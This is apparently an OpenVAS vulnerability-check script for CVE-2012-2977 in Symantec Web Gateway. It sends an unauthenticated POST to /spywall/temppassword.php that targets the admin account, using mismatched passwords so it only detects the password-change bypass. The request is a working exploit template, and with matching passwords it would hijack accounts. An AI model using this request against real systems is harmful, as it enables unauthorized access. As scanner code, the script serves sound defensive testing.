CPE = "cpe:/a:symantec:web_gateway";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103547" );
	script_bugtraq_id( 54430 );
	script_cve_id( "CVE-2012-2977" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:P/A:N" );
	script_version( "2020-10-20T15:03:35+0000" );
	script_name( "Symantec Web Gateway Password Change Security Bypass Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54430" );
	script_tag( name: "last_modification", value: "2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)" );
	script_tag( name: "creation_date", value: "2012-08-22 10:26:36 +0200 (Wed, 22 Aug 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_symantec_web_gateway_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "symantec_web_gateway/installed" );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for more
information." );
	script_tag( name: "summary", value: "Symantec Web Gateway is prone to a security-bypass vulnerability." );
	script_tag( name: "impact", value: "Successful exploits may allow attackers to change another user's
password allowing them to gain unauthorized access in the context of
the affected user. This may aid in further attacks." );
	script_tag( name: "affected", value: "Symantec Web Gateway versions 5.0.x.x are vulnerable." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
pass = "A,3$" + rand();
pass1 = "B,4$" + rand();
host = http_host_name( port: port );
ex = "USERNAME=admin&password2=" + pass + "&password=" + pass1 + "&Save=Save&target=executive_summary.php";
len = strlen( ex );
req = NASLString( "POST /spywall/temppassword.php HTTP/1.1\\r\\n", "Accept-Encoding: identity\\r\\n", "Content-Length: ", len, "\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Connection: close\\r\\n", "\\r\\n", ex );
data = http_send_recv( data: req, port: port );
if(ContainsString( data, "You have logged in using a temporary password" ) && ContainsString( data, "Please select a new one" ) && ContainsString( data, "Password doesn't match the retyped password" )){
	security_message( port: port );
	exit( 0 );
}

